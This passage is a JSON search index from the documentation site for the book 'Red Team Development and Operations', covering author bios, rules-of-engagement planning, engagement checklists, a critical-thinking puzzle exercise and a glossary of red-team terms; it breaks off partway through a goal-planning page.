[{"title":"About the Authors","type":0,"sectionRef":"#","url":"docs/about_the_authors","content":"","keywords":""},{"title":"Joe Vest","type":1,"pageTitle":"About the Authors","url":"docs/about_the_authors#joe-vest","content":"Twitter: @joevest LinkedIn: in/joe-vest Driven by his curiosity, perseverance, and passion for technology, Joe Vest's mantra for his work and teaching is: &quot;The journey of gaining experience can be as valuable as the end result.&quot; Joe has 20 years of experience in red teaming, penetration testing, and application security. Joe is currently the Cobalt Strike Technical Director at HelpSystems. Prior experience ranges from authoring the book &quot;Red Team Development and Operations,&quot; the original author of the SANS 564 red team course, red team lead on a DoD red team, owner of a security consulting company, and a former director at SpecterOps. This diverse experience has given him extensive knowledge of cyber threats, tools, and tactics, including threat emulation and threat detection.  "},{"title":"James Tubberville","type":1,"pageTitle":"About the Authors","url":"docs/about_the_authors#james-tubberville","content":"Twitter: @minis_io James Tubberville has held a number roles ranging from system and network administrator to Chief Information Security Officer during a 22+ year career. In addition to owning a successful security consulting company, James has built and managed security operations and testing programs for two Fortune 10 companies and provided executive level security and consulting services for several others in the Fortune 100 list. James is a former member and lead for a NSA certified Red Team and has extensive experience in threat intelligence based security operations and testing, analysis, and mitigation across a variety of commercial and government customers. James has also authored a book &quot;Red Team Development and Operations&quot;, developed the original SANS SEC 564 &quot;Red Team Operations and Threat Emulation&quot; course, and achieved numerous management, information technology, and security related certifications and awards.-- "},{"title":"About the Book","type":0,"sectionRef":"#","url":"docs/about_the_book","content":"About the Book Download the file_download Table of Contents Red Teaming is the process of using tactics, techniques, and procedures (TTPs) to emulate real-world threats to train and measure the effectiveness of the people, processes, and technology used to defend environments. Built on the fundamentals of penetration testing, Red Teaming uses a comprehensive approach to gain insight into an organization’s overall security to test its ability to detect, respond to, and recover from an attack. When properly conducted, Red Team activities significantly improve an organization’s security controls, help hone defensive capabilities, and measure the effectiveness of security operations. The Red Team concept requires a different approach from typical security testing and relies heavily on well-defined TTPs, which are critical to successfully emulating a realistic threat or adversary. Red Team results exceed a typical list of penetration test vulnerabilities, provide a deeper understanding of how an organization would perform against an actual threat, and identify where security strengths and weaknesses exist. Whether you support a defensive or offensive role in security, understanding how Red Teams can be used to improve security is extremely valuable. Organizations spend a great deal of time and money on the security of their systems, and it is critical to have professionals who can effectively and efficiently operate them. This book will provide you with the skills to manage and operate a Red Team, conduct Red Team engagements, and understand the role of a Red Team and its importance in security testing.","keywords":""},{"title":"Rules of Engagement (ROE) Planning","type":0,"sectionRef":"#","url":"docs/checklists/roe-planning","content":"","keywords":""},{"title":"ROE Document","type":1,"pageTitle":"Rules of Engagement (ROE) Planning","url":"docs/checklists/roe-planning#roe-document","content":"The ROE documents the target information, approvals, threat implementation, activities, and issues required to staff, coordinate, and execute engagements within the target environment. The main body of the ROE (often derived from a standing template) provides information on: The Red Team methodologyA high-level description of the types of activities that may be executedThe types of hardware and software that may be employedA recommended deconfliction processLevels of threat available (comparison)Roles and responsibilities of each functional group (Exercise Control Group (ECG), White Cell, Training Audience (TA), etc.)The identification of and references to appropriate legal requirements (PCI, FERPA, HIPAA, HITEC, SOX, GLBA, etc.)A legal responsibility disclaimer (federally mandated requirements for the Red Team to report certain findings) Information specific to each individual engagement should be documented in annexes to the ROE. At a minimum, ROE annexes should detail: The Target of the Engagement Organization nameAddressSpecific groups or divisionsOrganizational identifiersSenior management contact info An Engagement Contact List (name, role, phone, email, office location) ECG personnelWhite CellTrusted AgentsRed Team LeadRed Tech Lead Engagement Objectives ConditionsThreat levelTargeted objectivesTargets of opportunityMeasures of success/failure Authorized Target Space Network The IP boundaries of the eventDomains and/or workgroupsSpecific off-limits areas and resources (non-target intellectual property file share)Off-limits machines, networks, equipment, or applications (blacklist)Maintenance windows Physical Areas of the campusBuildingsOfficesOff-limits areas (e.g., the emergency services sector of a medical complex)Off-limits materials within the target space (e.g., sensitive documents or equipment) Authorized Actions: Types of activities approved for the engagement Restricted Actions: Types of activities restricted during the engagement (if any) The process for requesting approval of additional activities during engagement execution Approval processPoints of contact (name, role, phone, email, office location)Alternate POC The ROE must be updated when the target space, authorized actions, objectives, or scope are changed. For instance, the original scope may be limited to computer network attacks. If physical attacks are planned, the ROE must be updated to reflect the additional activities and controls. The Red Team Lead will address suggestions or adjustments to the ROE. Each review result must be provided to the originator. The final ROE must be approved by a Trusted Agent in senior management of the target environment. "},{"title":"Red team checklist","type":0,"sectionRef":"#","url":"docs/checklists/red-team-checklist","content":"","keywords":""},{"title":"Red Team Development Checklist","type":1,"pageTitle":"Red team checklist","url":"docs/checklists/red-team-checklist#red-team-development-checklist","content":"☐ Determine required knowledge and skills ☐ Identify and implement alternate methods for bridging knowledge gaps ☐ Develop roles and responsibilities guide☐ Develop red team methodology☐ Develop TTP guidance for engagements ☐ Includes Bag of tricks ☐ Develop data collection guide and tools☐ Develop operational process plan☐ Develop communication plan template☐ Develop ROE template☐ Develop technical briefing template☐ Develop report template "},{"title":"Planning - Red Team Engagement Checklist","type":1,"pageTitle":"Red team checklist","url":"docs/checklists/red-team-checklist#planning---red-team-engagement-checklist","content":"☐ Engagement Planning ☐ ROE ☐ Event Communication plan☐ Distribute Deconfliction Process☐ Entry point/method☐ Scope☐ Goals/Objectives (should address at least one of the following) ☐ Protect☐ Detect☐ Respond☐ Restore ☐ Target Restrictions☐ Target Infrastructure / Asset verification / Approvals ☐ Scenario Development☐ Operational Impact planning ☐ Develop threat profiles ☐ Network and Host Activity☐ IOC Generation (incl subsequent Analysis) and Management ☐ Plan threat infrastructure ☐ Tier 1 ☐ IPs☐ Systems☐ Redirectors☐ PPS ☐ Tier 2 ☐ IPs☐ Systems☐ Redirectors☐ PPS ☐ Tier 3☐ IPs☐ Systems☐ Redirectors☐ PPS☐ Deploy tools to infrastructure ☐ Data collection repository "},{"title":"Execution - Red Team Engagement Checklist","type":1,"pageTitle":"Red team checklist","url":"docs/checklists/red-team-checklist#execution---red-team-engagement-checklist","content":"☐ Daily completion and roll-up confirmation ☐ Capture logs☐ Capture screenshots☐ Capture system changes ☐ Daily (or twice daily) mandatory internal RT SITREP☐ Update real-time attack diagram "},{"title":"Culmination - Red Team Engagement Checklist","type":1,"pageTitle":"Red team checklist","url":"docs/checklists/red-team-checklist#culmination---red-team-engagement-checklist","content":"☐ Engagement Closeout ☐ Roll up data☐ Roll back system changes☐ Validate data has been collected☐ Outline critical attack diagram☐ Technical Review (tech-on-tech)☐ Executive Brief ☐ Reporting ☐ Draft attack narrative☐ Draft observation and findings☐ Finalize attack diagram☐ Finalize report "},{"title":"MITRE ATT&CK","type":0,"sectionRef":"#","url":"docs/Concepts/mitre_attack","content":"","keywords":""},{"title":"References","type":1,"pageTitle":"MITRE ATT&CK","url":"docs/Concepts/mitre_attack#references","content":"Description\tLinkATT&amp;CK\thttps://attack.mitre.org/wiki/Main_Page PRE-ATT&amp;CK\thttps://attack.mitre.org/pre-attack/index.php/Main_Page ATT&amp;CK Navigator\thttps://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/the-attck%E2%84%A2-navigator-a-new-open-source ATT&amp;CK Navigator Example\thttps://mitre.github.io/attack-navigator/enterprise/ "},{"title":"What is Red Teaming?","type":0,"sectionRef":"#","url":"docs/Concepts/red-teaming","content":"","keywords":""},{"title":"Why Red Team?","type":1,"pageTitle":"What is Red Teaming?","url":"docs/Concepts/red-teaming#why-red-team","content":"Measure the effectiveness of the people, processes, and technology used to defend a network. How do you know if blue TTPs are effective?Train and/or measure Blue Teams ability to impact a threat Blue teams need practice. Better to practice on a helpful threat that a real oneTest and understand specific threats or threat scenarios Red team engagements can be designed to exercise custom scenarios. Scenarios can include zero-days, ransom-ware attacks, or other unique attacks. "},{"title":"Threat Gets a Vote","type":1,"pageTitle":"What is Red Teaming?","url":"docs/Concepts/red-teaming#threat-gets-a-vote","content":"Dig deeper in the need for the threat perspective here. Threat Gets a Vote - Applying a Threat-Based Approach to Security Testing  How often do security defenders ask the bad-guy how or what they will do? Many organization develop security defenses without fully understanding what is important to a threat. Red teaming provides defenders an understanding of how a threat operates in a safe controlled process. Better to learn and practice with a Red Team than a real buy guy... anonymous blue teamer "},{"title":"Red Teaming vs Penetration Testing vs Vulnerability Testing","type":1,"pageTitle":"What is Red Teaming?","url":"docs/Concepts/red-teaming#red-teaming-vs-penetration-testing-vs-vulnerability-testing","content":"Follow this link for a comparison of security testing types. Red Team Engagement vs Penetration Test vs Vulnerability Assessment "},{"title":"Red Team Engagement vs Penetration Test vs Vulnerability Assessment","type":0,"sectionRef":"#","url":"docs/Concepts/red-vs-pen-vs-vuln","content":"","keywords":""},{"title":"Red Teaming in Perspective to Organizational Risk","type":1,"pageTitle":"Red Team Engagement vs Penetration Test vs Vulnerability Assessment","url":"docs/Concepts/red-vs-pen-vs-vuln#red-teaming-in-perspective-to-organizational-risk","content":"Security testing of any sort is ultimately about managing organization risk to threats. Using an inverse pyramid, we can illustrate the relationships between Red Teaming, Penetration Testing, and Vulnerability Assessments. This will help further define what Red Teaming IS and IS NOT.  Vulnerability assessments tend to be wide in coverage but narrow in scope. Consider a vulnerability assessment of all enterprise workstations. The scope is very wide, but not very deep in context of organizational risks. What can be said about risk when flaws are found? Organizational risk can only be understood at the workstation level? Overall risk to an organization may be extrapolated to a small degree, but generally stays at that workstation level. Vulnerability assessments are good at reducing the attack surface but do not provide direct information in terms of organizational risk.Penetrations tests take vulnerability assessments to the next level by exploiting and proving out attack paths. Penetration tests can often look and feel like a red team engagement and even use some of the same tools or techniques. The key difference lies in the goals and intent. The goal of a penetration test is to execute an attack against a target system to identify and measure risks associated with the exploitation of a target’s attack surface. Organizational risks can be indirectly measured and are typically extrapolated from some technical attack. What about the people and processes? This is where red teaming fits.Red Team Engagements are scenario based engagements driven by specific threat goals. Red teaming focuses on security operations as a whole and includes people, processes, and technology. Red teaming specifically focuses on goals related to training blue teams or measuring how security operations can impact a threat’s ability to operate. Technical flaws are secondary to understanding how the threat was able to impact an organization’s operations or how security operations was able to impact a threat’s ability to operate. "},{"title":"Bottom Line","type":1,"pageTitle":"Red Team Engagement vs Penetration Test vs Vulnerability Assessment","url":"docs/Concepts/red-vs-pen-vs-vuln#bottom-line","content":"Vulnerability assessment and Penetration tests are a means to identify technical flaws with the ultimate goal of reducing a targets attack surface. Red teaming is a goal driven scenario used to train or measure blue. Red teaming goals lie in understanding security operations as a whole. people, processes, and technology. "},{"title":"References","type":1,"pageTitle":"Red Team Engagement vs Penetration Test vs Vulnerability Assessment","url":"docs/Concepts/red-vs-pen-vs-vuln#references","content":"Threat Gets a Vote - Applying a threat-based approach to security testing "},{"title":"Roles and Relationships","type":0,"sectionRef":"#","url":"docs/Concepts/role-relationships","content":"Roles and Relationships tip An effective Red Team is comprised of a team of individuals who can contribute to the overall success. Diversity is crucial, but the team as a whole must be comprised of the core operator traits. A team can be even more successful when multiple team members contribute in various areas. In addition to the Red Team itself, successful execution of an engagement requires the involvement of numerous roles and groups. See the Definitions for more information.","keywords":""},{"title":"Adversarial Mindset Challenge","type":0,"sectionRef":"#","url":"docs/Exercises/mindset-challege","content":"","keywords":""},{"title":"Description","type":1,"pageTitle":"Adversarial Mindset Challenge","url":"docs/Exercises/mindset-challege#description","content":"In the exercise, you’ll quickly complete a series of puzzle challenges designed to encourage critical thinking in a short time frame. "},{"title":"Instructions","type":1,"pageTitle":"Adversarial Mindset Challenge","url":"docs/Exercises/mindset-challege#instructions","content":"Complete the puzzles in 5 minutesFollow each puzzle’s instructionsBegin when ready  !! Stop Here !! Do not continue until ready           "},{"title":"Start of Puzzles","type":1,"pageTitle":"Adversarial Mindset Challenge","url":"docs/Exercises/mindset-challege#start-of-puzzles","content":" "},{"title":"9 Dot Puzzle","type":1,"pageTitle":"Adversarial Mindset Challenge","url":"docs/Exercises/mindset-challege#9-dot-puzzle","content":"Instructions: Placing your pen on the page only once, draw four straight lines that pass through all nine dots without lifting the pen from the page.       "},{"title":"Maze Challenge","type":1,"pageTitle":"Adversarial Mindset Challenge","url":"docs/Exercises/mindset-challege#maze-challenge","content":"Instructions: Draw a line from the laptop to the data center.             "},{"title":"Triangle Puzzle","type":1,"pageTitle":"Adversarial Mindset Challenge","url":"docs/Exercises/mindset-challege#triangle-puzzle","content":"Instructions: Count the triangles. How many are shown? Answer:   "},{"title":"Word Puzzle","type":1,"pageTitle":"Adversarial Mindset Challenge","url":"docs/Exercises/mindset-challege#word-puzzle","content":"Instructions: Write your explanation to the following story. A man walks into a bar and asks the bartender for a glass of water. The bartender pulls out a gun and points it at the man. The man says “thank you&quot; and walks out.              "},{"title":"Alternative Thought Processing","type":1,"pageTitle":"Adversarial Mindset Challenge","url":"docs/Exercises/mindset-challege#alternative-thought-processing","content":"Instructions: Contemplate the following and think of areas in which common misconceptions or bias influence how security is implemented or approached in your organization. Given the red dots are areas in which combat aircraft are often hit during engagement, what does the following diagram indicate? What would be your recommendations for additional armoring of the aircraft?   !! Stop Here !! Warning: Do not continue until ready to see solutions              "},{"title":"Solutions (Don't Peek)","type":1,"pageTitle":"Adversarial Mindset Challenge","url":"docs/Exercises/mindset-challege#solutions-dont-peek","content":"The following are possible answers to the puzzles. "},{"title":"9 Dot Puzzle","type":1,"pageTitle":"Adversarial Mindset Challenge","url":"docs/Exercises/mindset-challege#9-dot-puzzle-1","content":" Possible answers are shown. How does your solution compare? "},{"title":"Maze Challenge","type":1,"pageTitle":"Adversarial Mindset Challenge","url":"docs/Exercises/mindset-challege#maze-challenge-1","content":" When thinking about solutions to problems, don’t let assumptions and limitations prevent possible solutions. "},{"title":"Triangle Puzzle","type":1,"pageTitle":"Adversarial Mindset Challenge","url":"docs/Exercises/mindset-challege#triangle-puzzle-1","content":"Total Triangles = 27 When faced with a problem for which you don’t know the &quot;formula,&quot; a brute force approach may be needed. Lessons can be learned, and &quot;formulas&quot; can be added to your knowledge base to improve efficiency when faced with similar problems in the future. Formula: T(n) = floor(n*(n + 2)*(2n + 1) / 8) Copy Example: f(4) = 4*(4 + 2)*(2*4 + 1) / 8 = 27.000 Copy Reference: http://www.billthelizard.com/2009/08/how-many-triangles.html "},{"title":"Word Puzzle","type":1,"pageTitle":"Adversarial Mindset Challenge","url":"docs/Exercises/mindset-challege#word-puzzle-1","content":"Classic Solution: The man had the hiccups and wanted a glass of water to help get rid of them. The bartender could hear the hiccups when the man spoke, so he brought the gun out to scare the hiccups away. It worked, and the man thanked him and left, no longer needing the glass of water. "},{"title":"Alternative Thought Processing","type":1,"pageTitle":"Adversarial Mindset Challenge","url":"docs/Exercises/mindset-challege#alternative-thought-processing-1","content":"During World War 2, the U.S. Navy performed a review of aircraft with combat encounters. This review intended to determine where aircraft needed additional armor to ensure survivability and safe return. Upon analysis the Navy decided all the locations where bullet holes were found needed to be better armored as they are more likely to be hit. These included the tips of the wings, the central body, and the elevators. A Navy Statistician, Abraham Wald had another theory. The areas with bullet holes identified where the aircraft was already survivable. He recommended armoring the nose, engine, and mid-body although few of the aircraft had damage to those areas. Why? Wald recognized those areas were also being shot; however, weren't able to return safely. He correctly surmised that aircraft with shots to the wings, central body, and elevators were able to return while those with shots to the nose, engine, and mid-body were catastrophically damaged and unable to return. Consider how this scenario translates to Red Teaming or security in general. Also consider what is known (and unknown) given information from threat intelligence, current events, and indicators. Reference: Wald, Abraham. (1943). A Method of Estimating Plane Vulnerability Based on Damage of Survivors. Statistical Research Group, Columbia University. CRC 432” — reprint from July 1980, http://www.dtic.mil/get-tr-doc/pdf?AD=ADA091073&amp;Location=U2&amp;doc=GetTRDoc.pdf  "},{"title":"Conclusion","type":1,"pageTitle":"Adversarial Mindset Challenge","url":"docs/Exercises/mindset-challege#conclusion","content":"In this exercise, you completed puzzles designed to encourage critical thinking. "},{"title":"Definitions","type":0,"sectionRef":"#","url":"docs/definitions","content":"","keywords":""},{"title":"Allow-list","type":1,"pageTitle":"Definitions","url":"docs/definitions#allow-list","content":"An allow-list is a list of things considered trustworthy or good. An allow-list is used to grant access to defined resources. This list is often associated with controlling traffic through firewall rules or controlling allowed applications by creating a list of authorized software. Creating a list of good is typically considered better practice over deny-listing. Allow-listing enforces the deny all by default approach to security. "},{"title":"Assumed Breach","type":1,"pageTitle":"Definitions","url":"docs/definitions#assumed-breach","content":"The Assumed Breach Model assumes a threat has some level of access to a target at the initiation of the engagement. This model is arguably the most beneficial of all the models. The threat is assumed to have some level of access to a target before beginning. This starts a scenario much further into the attack timeline. Assuming someone can breach a network is often argued by less mature organizations. Those who say &quot;prove it&quot; will often not like this scenario. Less mature organizations assume that threats must prove they can get in before beginning. When is the proof important? It is important only if measuring the ability a threat has to &quot;get in&quot; is important. If this is not a key goal, using the Assumed Breach Model will save time and money. It will free the Red Team to explore higher impact goals. "},{"title":"Blue Cell","type":1,"pageTitle":"Definitions","url":"docs/definitions#blue-cell","content":"The blue cell is the opposite side of red. Is it all the components defending a target network. The blue cell is typically comprised of blue team members, defenders, internal staff, and an organization’s management. "},{"title":"Blue Team","type":1,"pageTitle":"Definitions","url":"docs/definitions#blue-team","content":"A security team that defends against threats. "},{"title":"Command and Control (C2)","type":1,"pageTitle":"Definitions","url":"docs/definitions#command-and-control-c2","content":"Command and Control (C2) is the influence an attacker has over a compromised computer system that they control. "},{"title":"Command and Control Tiers","type":1,"pageTitle":"Definitions","url":"docs/definitions#command-and-control-tiers","content":"Designing a robust C2 infrastructure involves creating multiple layers of Command and Control. These can be described as tiers. Each tier offers a level of capability and covertness. The idea of using multiple tiers is the same as not putting all your eggs in one basket. If C2 is detected and blocked, having a backup will allow operations to continue. C2 tiers generally fall into three categories: Interactive, Short Haul, and Long Haul. These are sometimes labeled as Tier 1, 2, or 3. There is nothing unique to each tier other than how they are to be used. Interactive Used for general commands, enumeration, scanning, data exfiltration, etc.This tier has the most interaction and is at the greatest risk of exposure.Plan to lose access from communication failure, agent failure, or Blue Team actions.Run enough interactive sessions to maintain access. Although interactive, this doesn’t mean blasting the client with packets. Use good judgment to minimize interaction just enough to perform an action. Short haul Used as a backup to reestablish interactive sessions.Use covert communications that blend in with the target.Slow callback times. Callback times in the 1–24 hr. range are common. Long haul The same as Short Haul but even lower and slower.Slow callback times. Callback times of 24+ hours are common. "},{"title":"Control Cell","type":1,"pageTitle":"Definitions","url":"docs/definitions#control-cell","content":"a.k.a White Cell Serves as referee between Red Team activities and defender responses during an engagement. Controls the engagement environment/network. Monitors adherence to the ROE. Coordinates activities required to achieve engagement goals. Correlates Red Team activities with defensive actions. Ensures the engagement is conducted without bias to either side. "},{"title":"Deconfliction","type":1,"pageTitle":"Definitions","url":"docs/definitions#deconfliction","content":"Deconfliction is a process that provides a way to separate Red Team activity from real-world activity. "},{"title":"Deny-list","type":1,"pageTitle":"Definitions","url":"docs/definitions#deny-list","content":"A deny-list is a list of things considered untrustworthy or bad. A deny list is used to restrict access to defined resources. This list is often associated with controlling traffic through firewall rules or restricting access to prohibited software by creating a list of prohibited software. Creating a known bad list is typically more difficult than creating a known good list and denying everything else. "},{"title":"Engagement / Exercise Control Group (ECG)","type":1,"pageTitle":"Definitions","url":"docs/definitions#engagement--exercise-control-group-ecg","content":"The Engagement (or Exercise) Control Group is ultimately responsible for all activities conducted during the engagement. The Engagement Control Group is composed of one or two senior managers from the target environment (for example, a Chief Information Officer or Chief Operating Officer), one member from the Information Technology department of the environment, a White Cell, and a Red Team liaison. More may be added as required. All are considered to be Trusted Agents. "},{"title":"Exfiltration","type":1,"pageTitle":"Definitions","url":"docs/definitions#exfiltration","content":"Exfiltration is the extraction of information from a target. This is typically through a covert channel. "},{"title":"Get In, Stay In, Act","type":1,"pageTitle":"Definitions","url":"docs/definitions#get-in-stay-in-act","content":"The three main phases of a Red Team engagement. Get In Gain access to a network. The Red Team must have access to their target. Access can be through a legitimate compromise or access is directly granted as part of an assumed breach scenario, such as an insider threat scenario Stay In Establish persistence or a permanent presence. Red Team engagements are typically longer than other types of tests. A Red Team usually establishes persistence or a permanent presence to survive the duration of the engagement. Act Phase where a Red Team performs operational impacts against a target. "},{"title":"IOC (Indicator of Compromise)","type":1,"pageTitle":"Definitions","url":"docs/definitions#ioc-indicator-of-compromise","content":"Indicators of Compromise (IOCs) are artifacts that identify or describe threat actions. "},{"title":"OPFOR","type":1,"pageTitle":"Definitions","url":"docs/definitions#opfor","content":"An Opposing Force, or enemy force, that is typically used by the military in war-gaming scenarios. Red Teams are commonly associated with or support an OPFOR in war-gaming scenarios. "},{"title":"OPLOG (Operator Log)","type":1,"pageTitle":"Definitions","url":"docs/definitions#oplog-operator-log","content":"Operator logs are the records generated by Red Team operators during an engagement. These logs have specific and required fields that must be captured. "},{"title":"Operational Impact","type":1,"pageTitle":"Definitions","url":"docs/definitions#operational-impact","content":"An operational impact is the effect of a goal-driven action within a target environment. "},{"title":"OPSEC","type":1,"pageTitle":"Definitions","url":"docs/definitions#opsec","content":"OPSEC or Operational Security is a process that identifies critical information to determine if friendly actions can be observed by enemy intelligence, determines if information obtained by adversaries could be interpreted to be useful to them, and then executes selected measures that eliminate or reduce adversary exploitation of friendly critical information. In terms of Red Teaming, it is understanding what actions Blue can observe and minimizes exposure. "},{"title":"out brief, Executive","type":1,"pageTitle":"Definitions","url":"docs/definitions#out-brief-executive","content":"The first post-engagement meeting is usually the executive out brief. An executive brief is typically performed soon after execution completes (within one or two days following execution). This meeting is tailored toward management and should include key personnel from the target organization. The outcome of a Red Team engagement may impact how an organization operates in the future, potentially requiring funding to pursue mitigations or staffing modifications. Management awareness and buy-in are critical if Red Team results will be used to improve an organization's security stance to defend and respond to a threat. "},{"title":"out brief, Technical","type":1,"pageTitle":"Definitions","url":"docs/definitions#out-brief-technical","content":"The technical out brief (aka a tech-on-tech) is a bi-directional technical exchange of information between the Red Team, the Blue Team, and the organization. During this exchange, both the Red and the defensive elements provide a highly detailed, step-by-step technical review of the actions and results (including all associated details) of the engagement. This is where training and education meet and is one of the most valuable opportunities for all parties to learn. "},{"title":"Penetration Testing","type":1,"pageTitle":"Definitions","url":"docs/definitions#penetration-testing","content":"A test methodology intended to circumvent the security function of a system. Note: Penetration testing may leverage system documentation (e.g., system design, source code, manuals) and is conducted within specific constraints. Some penetration test methods use brute force techniques. source In terms of business risk, a penetration test should be considered an attack surface reduction effort as mitigation of the findings will ultimately lead to a reduction in the attack surface. Penetration tests do not typically focus on understanding how security operations as a whole can deal with a threat. See Red Teaming "},{"title":"Persistence","type":1,"pageTitle":"Definitions","url":"docs/definitions#persistence","content":"Persistence is the ability or techniques used to establish a permanent presence to survive the duration of the engagement. "},{"title":"Prepositioning","type":1,"pageTitle":"Definitions","url":"docs/definitions#prepositioning","content":"Prepositioning is the process of using the access and capabilities gained during an engagement to best position an operator to execute an impact. "},{"title":"Red Cell","type":1,"pageTitle":"Definitions","url":"docs/definitions#red-cell","content":"The term red cell is borrowed from the military. It is commonly associated with a group that plays OPFOR (opposing force) during red vs. blue exercises. A red cell is the components that make up the offensive portion of a red team engagement that simulates the strategic and tactical responses of a given target. The red cell is typically comprised of red team leads and operators and is commonly referred to as Red Team instead of Red Cell. "},{"title":"Red Team","type":1,"pageTitle":"Definitions","url":"docs/definitions#red-team","content":"A Red Team is an independent group that, from the perspective of a threat or adversary, explores alternative plans and operations to challenge an organizatioøn to improve its effectiveness. "},{"title":"Red Teaming","type":1,"pageTitle":"Definitions","url":"docs/definitions#red-teaming","content":"Red teaming is the process of using Tactics, Techniques, and Procedures (TTPs) to emulate real-world threats with the goal of training and measuring the effectiveness of the people, processes, and technology used to defend an environment. In terms of business risk, a red team engagement focuses on understanding how well security operations deal with a threat through training or measurement. Technical findings are often revealed during an engagement but are not the focus. Red teaming engagements are designed to challenge security operation’s defensive strategies and assumptions and to identify gaps or flaws in the defensive strategies. Improving security operations through training or measurement is the goal of a red teaming engagement. "},{"title":"Red Team Lead","type":1,"pageTitle":"Definitions","url":"docs/definitions#red-team-lead","content":"Serves as the operational and administrative lead for the Red Team. Conducts engagement, budget, and resource management for the Red Team, Provides oversight and guidance for engagements, capabilities, and technologies. Ensures adherence to all laws, regulations, policies, and Rules of Engagement. "},{"title":"Red Team Operator","type":1,"pageTitle":"Definitions","url":"docs/definitions#red-team-operator","content":"Complies with all Red Team requirements under the direction of the Red Team Lead. Operational executor of the engagement. Applies Red Team TTPs to the engagement. Provides technical research and capability to the Red Team. Keeps detailed logs during each phase of the engagement. Provides log and information support for the creation of the final report "},{"title":"Rules of Engagement (ROE)","type":1,"pageTitle":"Definitions","url":"docs/definitions#rules-of-engagement-roe","content":"The Rules of Engagement establish the responsibilities, relationships, and guidelines among the Red Team, the customer, the system owner, and any stakeholders required for engagement execution. "},{"title":"Situational Awareness","type":1,"pageTitle":"Definitions","url":"docs/definitions#situational-awareness","content":"Situational awareness is a step in a Red Team engagement used to gather as much information as needed on the targets and target environment. The information gathered is used to determine the next actions towards privilege escalation, lateral movement, or other steps. It is a crucial component to Red Teaming and should be performed to some level on all access targets. "},{"title":"Threat","type":1,"pageTitle":"Definitions","url":"docs/definitions#threat","content":"A threat is an expression of intention to inflict evil, injury, or damage. "},{"title":"Threat Emulation","type":1,"pageTitle":"Definitions","url":"docs/definitions#threat-emulation","content":"Threat Emulation is the process of mimicking the TTPs of a specific threat. "},{"title":"Threat Intelligence","type":1,"pageTitle":"Definitions","url":"docs/definitions#threat-intelligence","content":"Threat intelligence is information that has been aggregated, transformed, analyzed, interpreted, or enriched to provide the context for decision-making processes regarding threats. "},{"title":"Threat Model","type":1,"pageTitle":"Definitions","url":"docs/definitions#threat-model","content":"A threat model is a process by which potential threats or the absence of appropriate safeguards can be identified, enumerated, and mitigations can be prioritized. "},{"title":"Threat Perspective","type":1,"pageTitle":"Definitions","url":"docs/definitions#threat-perspective","content":"a Threat's Perspective is the threat's initial point of view. This perspective is used to build and shape a threat profile or scenario. A threat's perspective may be that of an outsider, nearsider, or insider. "},{"title":"Threat Profile","type":1,"pageTitle":"Definitions","url":"docs/definitions#threat-profile","content":"A threat profile is used to establish the rules as to how a Red Team will act and operate. These rules serve as a roadmap for a Red Team by guiding how and what type of actions should be performed. Threat profiles are a key part of developing and designing C2 early in Red Team planning. "},{"title":"Threat Scenario","type":1,"pageTitle":"Definitions","url":"docs/definitions#threat-scenario","content":"Scenarios provide insight into how a defensive solution will perform and conform to the processes, procedures, policies, activities, personnel, organizations, environment, threats, constraints, assumptions, and support involved in the security mission. Scenarios generally describe the role of the threat, how it will interact with the systems and networks within the target environment, and elicits real-world truth of how essential internal practices are employed. In short, it answers how the target's security operations would dynamically perform an action to deliver results, outputs, or prove capability. "},{"title":"Tradecraft","type":1,"pageTitle":"Definitions","url":"docs/definitions#tradecraft","content":"Tradecraft is the techniques and procedures of espionage. Tradecraft is typically associated with the intelligence community. TTPs and Tradecraft are used interchangeably in this course. "},{"title":"Trusted Agent (TA)","type":1,"pageTitle":"Definitions","url":"docs/definitions#trusted-agent-ta","content":"The Trusted Agent’s primary role is to limit irreversible damage and risk to life, limb, eyesight, and equipment; however, they are more often used to prevent the defenders from causing unexpected self-inflicted damage. A Trusted Agent (TA) has privileged and detailed knowledge of engagement activities, milestones, conditions, and the engagement status that would unduly bias or influence the actions of the environment staff and defenders. A Trusted Agent must protect all information from being provided to any party without the express approval of the Engagement Control Group. "},{"title":"TTPs","type":1,"pageTitle":"Definitions","url":"docs/definitions#ttps","content":"TTPs are Tactics, Techniques and Procedures (sometimes called Tools, Techniques, and Procedures). "},{"title":"Two Person Integrity (TPI)","type":1,"pageTitle":"Definitions","url":"docs/definitions#two-person-integrity-tpi","content":"Two-person integrity is used to verify activities performed during the engagement and should be maintained at all times. A team member should review, understand, and provide a “sanity check” for each action/command performed. TPI reduces personal and engagement risks. "},{"title":"Vulnerability Assessment","type":1,"pageTitle":"Definitions","url":"docs/definitions#vulnerability-assessment","content":"Systematic examination of an information system or product to determine the adequacy of security measures, identify security deficiencies, provide data from which to predict the effectiveness of proposed security measures, and confirm the adequacy of such measures after implementation. source In terms of business risk, a vulnerability assessment should be considered an attack surface reduction effort as mitigation of the findings will ultimately lead to a reduction in the attack surface. "},{"title":"Web Shell","type":1,"pageTitle":"Definitions","url":"docs/definitions#web-shell","content":"A web shell is a piece of web code that is placed on a web server to allow an adversary to use the Web server as a gateway into a network. Web shells are commonly deployed as part of an application security attack. "},{"title":"Red Team Guides","type":0,"sectionRef":"#","url":"docs/guides","content":"Red Team Guides This guides contains documentation and guides that further support the Red Team Development and Operations book","keywords":""},{"title":"Red Team Engagement Goal Planning","type":0,"sectionRef":"#","url":"docs/Planning/goal-planning","content":"","keywords":""},{"title":"Common Goals: Measure and observe ...","type":1,"pageTitle":"Red Team Engagement Goal Planning","url":"docs/Planning/goal-planning#common-goals-measure-and-observe-","content":""},{"title":"A threat’s ability to access to common and restricted areas (physical)","type":1,"pageTitle":"Red Team Engagement Goal Planning","url":"docs/Planning/goal-planning#a-threats-ability-to-access-to-common-and-restricted-areas-physical","content":"What ability does a threat have to access common areas?What ability does a threat have to access restricted areas?Can a threat use access gained to enable cyber capabilities?What impacts can a threat have through gained access? "},{"title":"A threat’s ability to access key/critical systems","type":1,"pageTitle":"Red Team Engagement Goal Planning","url":"docs/Planning/goal-planning#a-threats-ability-to-access-keycritical-systems","content":"Can a threat access key/critical systems?What impacts can a threat have on key/critical systems? "},{"title":"A threat’s ability to move freely throughout a network","type":1,"pageTitle":"Red Team Engagement Goal Planning","url":"docs/Planning/goal-planning#a-threats-ability-to-move-freely-throughout-a-network","content":"What ability does a threat have to freely move throughout a network? "},{"title":"A threat’s ability to gain domain wide and local administrative access?","type":1,"pageTitle":"Red Team Engagement Goal Planning","url":"docs/Planning/goal-planning#a-threats-ability-to-gain-domain-wide-and-local-administrative-access","content":"What ability does a threat have to gain local administrative access?What ability does a threat have to gain domain administrative access?What ability does a threat have 